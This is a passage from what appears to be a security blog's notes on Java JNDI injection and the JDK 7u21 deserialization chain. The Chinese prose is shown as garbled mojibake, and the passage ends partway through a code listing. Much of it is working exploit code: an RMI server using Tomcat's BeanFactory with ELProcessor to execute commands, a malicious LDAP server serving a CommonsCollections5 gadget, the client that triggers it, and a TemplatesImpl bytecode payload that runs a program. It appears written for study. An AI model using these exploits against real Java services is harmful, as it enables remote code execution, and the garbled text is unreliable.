æ–¹æ³•ã€‚åœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨org.apache.naming.factory.BeanFactoryï¼Œå®Œç¾ç¬¦åˆï¼Œå­˜åœ¨ä¸Tomcatä¾èµ–åŒ…ä¸­ï¼Œæ‰€ä»¥å¯ä»¥å¹¿æ³›ä½¿ç”¨ã€‚\nåœ¨BeanFactoryçš„getObjectInstance()ä¸­é€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteæ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼å…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚\næ¯”å¦‚JNDI-Ldapå°±åœ¨ä¸‹ä»£ç å®ä¾‹åŒ–Referenceç±»ï¼š\nä¹Ÿå°±æ˜¯å¦‚ä¸‹è®¾ç½®Referenceç±»ï¼š\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨å¯ä»¥å°è¯•å°†å®¢æˆ·ç«¯è·å–åˆ°çš„Referenceç±»æŒ‡å‘å¯æ§æ¶æ„ç±»ã€‚\nç»§ç»­å¾€åé¢èµ°ï¼Œåªè¦è¿™é‡Œçš„getObjectFactoryFromReferenceç±»æˆåŠŸå®ä¾‹åŒ–æŒ‡å‘ç±»ï¼Œè€Œä¸åƒä¹‹å‰é‚£æ ·å¼¹å‡ºè®¡ç®—æœºå¯¼è‡´å¼‚å¸¸è¾“å‡ºï¼Œè¿™é‡Œå°±æœ‰æœºä¼šè°ƒç”¨åˆ°è¿™ä¸ªæŒ‡å‘ç±»çš„getObjectInstance()æ–¹æ³•ï¼š\nâ€”â€”â€”â€”â€”â€”\nJNDI-RMIè¿‡ç¨‹ä¸­è·å–Referenceç±»æ˜¯ç›´æ¥ä»æ•°æ®æµä¸­è¯»å–çš„ï¼Œå¯ä»¥è‡ªå·±è·Ÿè·Ÿï¼Œä¸èµ˜è¿°äº†ï¼Œç„¶åè°ƒç”¨åˆ°æŒ‡å®šç±»çš„getObjectInstance()æ–¹æ³•æ˜¯å·®ä¸å¤šçš„ã€‚\nç°åœ¨åœ¨pom.xmlä¸­å¼•å…¥è¿™ä¸ªå­˜åœ¨BeanFactoyç±»çš„ä¾èµ–æ¥æœ¬åœ°æµ‹è¯•ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.20\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ä»£ç å®ç°åŠåˆ†æ ç›´æ¥ç»™ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDI_RMI_Server_ByPass { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); ResourceRef resourceRef = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;, (String)null, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, true, \u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;, (String)null); resourceRef.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;faster=eval\u0026#34;)); resourceRef.add(new StringRefAddr(\u0026#34;faster\u0026#34;, \u0026#34;Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#34;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind(\u0026#34;Hello\u0026#34;, referenceWrapper); System.out.println(\u0026#34;Registryè¿è¡Œä¸­......\u0026#34;); } } ç„¶åç°åœ¨å°±åªéœ€è¦å…ˆè¿è¡Œè¿™ä¸ªServerç«¯ï¼Œå†è¿è¡Œå®¢æˆ·ç«¯æ¥è¯·æ±‚å³å¯ã€‚\næ³¨æ„ï¼šè¿™æ˜¯æ ¹æ®BeanFactoryçš„ä»£ç é€»è¾‘ï¼Œè¦æ±‚ä¼ å…¥çš„Referenceä¸ºResourceRefç±»ï¼Œå¹¶ä¸æ˜¯å‰é¢çš„Referenceç±»ã€‚\næ‰€ä»¥å½“è°ƒç”¨åˆ°decodeObject()æ–¹æ³•æ—¶ï¼Œæ–¹æ³•ä¸­è·å–åˆ°çš„æ˜¯ResourceRefç±»ï¼š å³è¿™é‡Œçš„var3çš„å€¼ï¼š ç„¶åä¼šè°ƒç”¨NamingManagerç±»çš„getObjectInstance()æ–¹æ³•ï¼Œç›´æ¥åˆ°å…³é”®åœ°æ–¹ï¼š è¿™ä¸ªæ–¹æ³•å†…ä¼šè°ƒç”¨getObjectFactoryFromReference()æ–¹æ³•ï¼Œä¼šåŠ è½½å¹¶å®ä¾‹åŒ–BeanFactoryç±»ï¼š\nreturnåå°±ä¼šè°ƒç”¨åˆ°è¿™ä¸ªBeanFactoryç±»çš„getObjectInstance()æ–¹æ³•ï¼š ä¼ å…¥å‚æ•°çš„å‚æ•°ç®€å•è¯´è¯´ï¼š1.å‰é¢è·å–çš„ResourceRefç±»ï¼Œ2.Helloï¼Œ3.RegistryContextç±»ï¼Œ4.ç©ºçš„Hashtabelç±»\nç»™ä¸‹RegistryContextç±»çš„å€¼çš„æƒ…å†µï¼š\nå‰é¢çš„åˆ†æä¸­ç»å¸¸è¯´è¿™ä¸ªç±»çš„åˆ›å»ºï¼Œå‚æ•°ä¼ é€’è€Œå·²ï¼Œä¸å¤šè¯´ã€‚\nç°åœ¨æ¥è·Ÿè¿›BeanFactoryç±»çš„getObjectInstance()æ–¹æ³•ï¼š å¯ä»¥çœ‹åˆ°è¿›å…¥è¿™ä¸ªifè¯­å¥çš„æ¡ä»¶å°±æ˜¯éœ€è¦objä¸ºResouceRefç±»æˆ–å…¶å­ç±»ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦ä¼ é‚£ä¸ªç±»ã€‚\nçœ‹tryè¯­å¥ï¼Œå‰ä¸‰ä¸ªä¸å¤šè¯´ï¼Œè·å–çš„å€¼æƒ…å†µï¼š ç„¶åè¿›å…¥ç¬¬äºŒä¸ªifæ¡ä»¶ï¼Œå°±ä¼šå°è¯•åŠ è½½javax.el.ELProcessorç±»ï¼Œä¼šæˆåŠŸåŠ è½½åˆ°Classå¯¹è±¡ã€‚ç»§ç»­å¾€åçœ‹ï¼š\nä¼šè¿›å…¥elseè¯­å¥ï¼Œä½†æ˜¯åé¢ä¼šæŠ¥é”™ï¼Œéœ€è¦åˆå¼•å…¥ä¸€ä¸ªä¾èµ–ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.el\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;com.springsource.org.apache.el\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.0.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç»§ç»­çœ‹ï¼Œ\nå¯ä»¥çœ‹åˆ°å°†å…¶æ”¾è¿›äº†HashMapç±»ä¸­åœ¨åç»­ä»£ç ä¸­åˆå°†å…¶å–å‡ºåˆ©ç”¨;\nå¹¶ç›´æ¥è°ƒç”¨ï¼š\nå³ç°åœ¨å°±ä¼šè°ƒç”¨åˆ°calc\nåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œååºè§¦å‘æœ¬åœ°Gadget åŒæ ·æ˜¯åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetã€‚\næœåŠ¡ç«¯ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 package JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.InetAddress; import java.net.URL; import java.util.HashMap; import java.util.Map; public class LDAP_EVIL_Server { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main ( String[] tmp_args ) throws Exception{ String[] args=new String[]{\u0026#34;http://127.0.0.1:8081/#test\u0026#34;}; int port = 4444; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); //$NON-NLS-1$ ds.startListening(); } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;foo\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaSerializedData\u0026#34;,CommonsCollections5()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } private static byte[] CommonsCollections5() throws Exception{ Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;test\u0026#34;); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null); Field field=badAttributeValueExpException.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); objectOutputStream.close(); return byteArrayOutputStream.toByteArray(); } } å®¢æˆ·ç«¯ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 package JNDI; import javax.naming.InitialContext; public class LDAP_Client { public static void main(String[] args) throws Exception { Object object=new InitialContext().lookup(\u0026#34;ldap://127.0.0.1:4444/dc=example,dc=com\u0026#34;); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a\nhttps://www.javasec.org/javase/JNDI/\nhttps://www.cnblogs.com/nice0e3/p/13958047.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\nhttps://baicany.github.io/2023/08/19/jndi/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory\n","date":"2024-10-22T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jndi/","title":"JNDI"},{"content":"JDK 7u21 7u21è¿™æ¡é“¾ä¸éœ€è¦ä»»ä½•ä¾èµ–ï¼Œå®Œå…¨æ˜¯é  java åŸç”Ÿç±»æ¥è¿›è¡Œåˆ©ç”¨ã€‚\nå½±å“ç‰ˆæœ¬ï¼šJDK \u0026lt;= 7u21\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 7u21 ideaéœ€è¦æ”¹é…ç½®ï¼Œæˆ‘å‰é¢éƒ½æ˜¯1.8ï¼Œè¿™é‡Œæ”¹æˆJDK7å³å¯ï¼ŒæŒ‰ç…§ä¸‹é¢è¿™ä¸ªæ–‡ç« æ¥è¯¥å³å¯ï¼š\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\nhttps://blog.csdn.net/wz1509/article/details/141857535\nå‰ç½®è¯´æ˜ é“ºå« è¿™é‡Œçš„JDK7u21è¿˜æ˜¯åˆ©ç”¨çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œè¿™é‡Œå¯ä»¥è·å–åˆ°ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œå…ˆç®€å•ç»™ä¸ªé“ºå«çŸ¥è¯†ï¼Œåœ¨å‰é¢CCé“¾çš„å­¦ä¹ å…¶å®ä¹Ÿç”¨è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨ä¸€æ¬¡åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•æœ‰ï¼š\nnewTransformer()ï¼š getOutputProperties()ï¼š å…¶å®ç›´æ¥ç”¨getTransletInstance()æ–¹æ³•åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯ä¸æ˜¯å¾ˆå¥½åˆ©ç”¨ã€‚\nä¸Šé¢è¯´çš„ä¸¤ä¸ªæ–¹æ³•ä¹Ÿå®šä¹‰äºTemplates.javaæ¥å£ç±»ï¼Œå¦‚ä¸‹ï¼š ä¹Ÿæ˜¯å‰é¢ç”¨è¿‡çš„ã€‚\nAnnotationInvocationHandler åœ¨å‰é¢çš„CC1çš„LazyMapé“¾ä¸­ï¼Œå°±åˆ©ç”¨åˆ°äº†è¿™ä¸ªç±»ï¼Œåœ¨é‚£é‡Œåˆ©ç”¨åˆ°äº†è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ï¼Œä¸ºäº†è°ƒç”¨åˆ°getæ–¹æ³•ï¼š\nä½†æ˜¯åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ªç±»çš„equalsImpl()æ–¹æ³•ï¼ŒåŒæ ·çš„æ˜¯åœ¨è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ä¸­åˆ©ç”¨ï¼Œå¦‚ä¸Šå›¾ç‰‡æ ‡æ³¨ã€‚\nequalsImpl() ç°åœ¨å†æ¥çœ‹è¿™ä¸ªequalsImpl()æ–¹æ³•ï¼š è¿™é‡Œè°ƒç”¨äº†invoke()æ–¹æ³•ï¼Œéœ€è¦var1ä¸æ˜¯AnnotationInvocationHandlerç±»å®ä¾‹å¹¶ä¸”éœ€è¦ä¸ºtypeå˜é‡çš„ä¸€ä¸ªç±»å®ä¾‹æ‰èƒ½è°ƒç”¨ï¼Œå†æ¥è·Ÿè¿›ä¸€ä¸‹å‰é¢var2çš„getMemberMethods()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯è·å–åˆ°typeå˜é‡é‡Œçš„æ–¹æ³•ï¼Œåœ¨AnnotationInvocationHandlerç±»çš„typeå˜é‡å®šä¹‰ï¼š\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„è·å–AnnotationInvocationHandlerç±»çš„æ„é€ æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥ç»™è¿™ä¸ªå˜é‡å®šå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å°†è¿™é‡Œçš„typeå˜é‡èµ‹å€¼ä¸ºTemplates.classæ¥å£ç±»ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è·å–åˆ°æƒ³åˆ©ç”¨çš„æ–¹æ³•ã€‚\nå‚è€ƒCC1ï¼Œç°åœ¨è¿™é‡Œå°±å¯ä»¥å†æ¬¡å°è¯•ä½¿ç”¨åŠ¨æ€ä»£ç†æ¥è°ƒç”¨åˆ°è¿™ä¸ªAnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•ï¼Œè¿›è€Œè¿›è¡Œå…¶ä»–æ“ä½œã€‚\nHashMap è¿™é‡Œä¸ºä»€ä¹ˆä¼šç”¨åˆ°HashMapå‘¢ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªç±»çš„readObject()æ–¹æ³•ä¸­å¯¹ä»£ç†å¯¹è±¡è°ƒç”¨äº†å®ƒçš„æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š è¿›å…¥è¿™ä¸ªputForCreate()æ–¹æ³•ï¼š åªè¦æ»¡è¶³å‰é¢çš„æ¡ä»¶ï¼Œè¿™é‡Œå°±å¯ä»¥æˆåŠŸå¯¹è¿™ä¸ªkeyè°ƒç”¨equals()æ–¹æ³•ï¼Œåªè¦æˆ‘ä»¬å°†è¿™ä¸ªkeyè®¾ç½®ä¸ºAnnotationInvocationHandlerçš„ä»£ç†å¯¹è±¡ï¼Œå°±å¯ä»¥æˆåŠŸè°ƒç”¨åˆ°è¿™ä¸ªAnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•\nåŒç†æ„Ÿè§‰HashSetï¼ŒHashtableä¹Ÿèƒ½æ„é€ ï¼Œåªè¦èƒ½ä½¿è°ƒç”¨çš„æ–¹æ³•ä¸ºequals()æ–¹æ³•å³å¯è°ƒç”¨equalsImpl()æ–¹æ³•ï¼š ç®€å•è¯´æ˜ä¸€ä¸‹å‚æ•°é—®é¢˜ï¼škey.equals(k);ï¼Œå½“è·³è½¬åˆ°AnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•æ—¶ï¼Œè¿™é‡Œå¯¹åº”çš„å‚æ•°åˆ†åˆ«ä¸º\nvar2ï¼ˆæ–¹æ³•åï¼‰ï¼šequals va3ï¼ˆå‚æ•°ï¼‰ï¼šk æ‰€ä»¥ç»“åˆå‰é¢invoke()æ–¹æ³•ï¼Œè¿™é‡Œçš„kéœ€è¦ä¸ºTemplatesImplç±»çš„å®ä¾‹ï¼Œå¯¹åº”çš„å°±æ˜¯å‰ä¸€ä¸ªputè¿›çš„å€¼ï¼š\nè¿™å¼ å›¾è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦putè¿›ä¸¤ä¸ªå€¼ï¼Œå¹¶ä¸”å‰ä¸€ä¸ªéœ€è¦ä¸ºtemplateImplç±»çš„å®ä¾‹ï¼Œå¦ä¸€ä¸ªä¸ºä»£ç†å¯¹è±¡ã€‚\nç°åœ¨å¯ä»¥æ•²å®šåŸºæœ¬æ¡†æ¶äº†ï¼Œå¤§æ¦‚æƒ³ä¸€ä¸‹æµç¨‹ï¼Œååºï¼š\næ”¾é”®å€¼å¯¹åˆ°å…¶ä¸­ã€‚ è°ƒç”¨åˆ°AnntationInvocationHandlerçš„invoke()æ–¹æ³• è°ƒç”¨equalsImpl()æ–¹æ³• è°ƒç”¨getMemberMethods()æ–¹æ³•è·å–åˆ°typeçš„classå¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ æ‰§è¡Œinvokeæ¥åŠ¨æ€åŠ è½½å­—èŠ‚ç  æ”»å‡»æ„é€  HashMap åŸºæœ¬ç›˜ï¼š\nTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯çœ‹å¦‚ä½•å°†è¿™ä¸ªé…ç½®å¥½äº†çš„æ¶æ„å­—èŠ‚ç èƒ½è¢«åˆ©ç”¨åˆ°ã€‚\nååºåˆ—åŒ–éƒ¨åˆ† å…ˆä»ååºåˆ†æèµ·ï¼š\nè¿™é‡Œå°±æ˜¯ä»åºåˆ—åŒ–æ•°æ®ä¸­æå–å‡ºé”®å€¼ï¼Œç„¶åè°ƒç”¨putForCreate()æ–¹æ³•å°è¯•å°†å…¶æ”¾å…¥é”®å€¼è¡¨ä¸­ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªputForCeate()æ–¹æ³•ï¼š é‡ç‚¹è¿˜æ˜¯æ ‡æ³¨å‡ºæ¥çš„åœ°æ–¹ã€‚\né¦–å…ˆå°±æ˜¯hashå€¼çš„è®¾å®šï¼Œé‚£é‡Œçš„é€»è¾‘å°±æ˜¯å¦‚æœ keyä¸ºnullï¼Œé‚£ä¹ˆhashå€¼å°±ä¸º0ï¼Œå¦åˆ™å°±æ˜¯è°ƒç”¨hash()æ–¹æ³•æ¥è®¡ç®—keyçš„çš„å“ˆå¸Œå€¼ã€‚ è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„hash()æ–¹æ³•ï¼Œç®—æ³•å¦‚ä¸‹ï¼š\nå…¶æ¬¡å°±æ˜¯åé¢çš„ifæ¡ä»¶å†…çš„åˆ¤æ–­ã€‚javaä¸­çš„\u0026amp;\u0026amp;è¿ç®—ç¬¦ä¼šæŒ‰å‰åé¡ºåºæ‰§è¡Œï¼Œå¹¶ä¸”éœ€è¦å‰é¢çš„çœŸæ‰ä¼šæ‰§è¡Œåé¢ã€‚è€Œåé¢çš„||è¿ç®—ç¬¦åªè¦ä¸€ä¸ªä¸ºçœŸå³å¯ã€‚ æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦æ»¡è¶³å‰é¢çš„hashå€¼æ¡ä»¶ä¸ºçœŸã€‚å°±å¯ä»¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚\né—®é¢˜ä¸€ï¼ˆhashå€¼ï¼‰ hashå€¼ç›¸åŒçš„é—®é¢˜ã€‚\nç»“åˆå‰é¢çš„åˆ†æåŠCCé“¾çš„å­¦ä¹ ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦putè¿›ä¸¤ä¸ªå€¼ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå€¼ä¸ºä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚\nç°åœ¨æ¥çœ‹ä¸€ä¸‹hashå€¼çš„è®¡ç®—é—®é¢˜ã€‚å›åˆ°hashè®¡ç®—éƒ¨åˆ†ä»£ç ï¼š\næ€è€ƒä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå€¼å°±æ˜¯ç›´æ¥è°ƒç”¨å®ƒçš„hashCode()æ–¹æ³•ï¼Œç¬¬äºŒä¸ªputè¿›çš„å€¼éœ€è¦ä¸ºä»£ç†å¯¹è±¡ã€‚å…ˆè·Ÿç¬¬äºŒä¸ªé”®å€¼å¯¹çš„è®¡ç®—æ–¹æ³•ï¼š ç”±äºæˆ‘ä»¬ä¼ å…¥çš„kæ˜¯AnnotationInvocationHandleä»£ç†å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨hashCode()æ–¹æ³•å°±ä¼šåˆ°AnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨åˆ°hashCodeImpl()æ–¹æ³•ï¼š\nè·Ÿè¿›è¿™ä¸ªhashCodeImpl()æ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•å£°æ˜äº†ä¸€ä¸ªMap.Entryç±»å‹çš„var3ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªè¿­ä»£å™¨var2ï¼Œç”¨äºéå†this.memberrValueså˜é‡çš„æ¡ç›®é›†ï¼Œæ‰€ä»¥è¿™é‡Œçš„membeValuesåº”è¯¥ä¸ºä¸€ä¸ªMapå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªHashMapå®ä¾‹æ¥ä»£è¡¨ã€‚\nå¦‚æœ membeValues åªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè¯¥hashå°±ç­‰äº127 * key.hashCode() ^ value.hashCode()ï¼Œè€Œå½“key.hashCodeä¸º0ï¼Œä»»ä½•æ•°å¼‚æˆ–0çš„ç»“æœä»æ˜¯ä»–æœ¬èº«ï¼š åœ¨ysoserialé¡¹ç›®æä¾›äº†ä¸€ä¸ªå­—ç¬¦ä¸²f5a5a608ï¼Œå…¶hashCodeå€¼æ­£å¥½ä¸º0ã€‚æ‰€ä»¥è¯¥hashè®¡ç®—å¯ä»¥ç®€åŒ–æˆvalue.hashCodeï¼Œ\né‡ç‚¹æ¥äº†ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡äº†putè¿›çš„ç¬¬ä¸€ä¸ªå€¼éœ€è¦ä¸ºTemplatesImplç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å‰é¢åœ¨è®¡ç®—hashå€¼è°ƒç”¨çš„hash()æ–¹æ³•ä¸­ï¼Œè®¡ç®—æ–¹å¼å°±æ˜¯templatesImpl.hashCode()ã€‚\nè€Œåªè¦æˆ‘ä»¬å°†valueè®¾ç½®ä¸ºTemplatesImplå¯¹è±¡ï¼Œå°±èƒ½å®ç°Proxy.hashCodeç­‰äºTemplatesImpl.hashCodeï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªçš„è®¡ç®—æ–¹å¼ä¹Ÿæ˜¯templatesImpl.hashCode()ã€‚\nè¿™æ ·å°±èƒ½æˆåŠŸé€šè¿‡hashå€¼ç›¸åŒçš„é—®é¢˜ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\né—®é¢˜è§£å†³ï¼Œå°è¯•æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 